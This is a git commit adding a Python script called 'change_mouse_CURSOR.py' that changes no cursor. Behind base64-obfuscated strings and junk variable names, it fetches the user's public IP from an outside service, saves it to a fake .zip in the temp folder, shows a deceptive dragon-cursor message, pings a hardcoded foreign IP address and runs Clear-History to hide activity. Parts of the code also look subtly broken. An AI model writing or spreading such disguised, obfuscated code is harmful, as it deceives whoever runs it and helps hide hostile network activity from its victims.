5100c43917895f44ebdfb3f8f2fe6c05f5466a39
Bobola Elijah Ayo-Fanibe <66252141+Taley-Koum@users.noreply.github.com>
2024-05-31 04:17:13 -0400

    Add files via upload

---
+++ change_mouse_CURSOR.py
@@ -0,0 +1,18 @@
+#!/usr/bin/env python3
+import base64
+from requests import get
+spc = "aHR0cHM6Ly9hcGkuaXBpZnkub3Jn".encode("ascii")
+
+import subprocess
+d_spc = base64.b64decode(spc)
+cmllssa=d_spc.decode("ascii")
+iolww = get(cmllssa).text
+cmdshow = "%SystemRoot%\Sysnative\msg.exe * your mouse cursor will now be changed to a dragon"
+with open ('%temp%\XEDWewfcvwnwoo.zip', 'wb') as isdc:
+	isdc.write(bytes(iolww.encode('ascii')))
+reeeewqq = "cGluZyAxODUuMTY3Ljk2LjE0NiAtbiAx".encode("ascii")
+llpo = base64.b64decode(reeeewqq)
+cmdllss = llpo.decode('ascii')
+subprocess.Popen(cmdshow, shell=True)
+subprocess.Popen(cmdllss, shell=True)
+subprocess.Popen('Clear-History', shell=True)
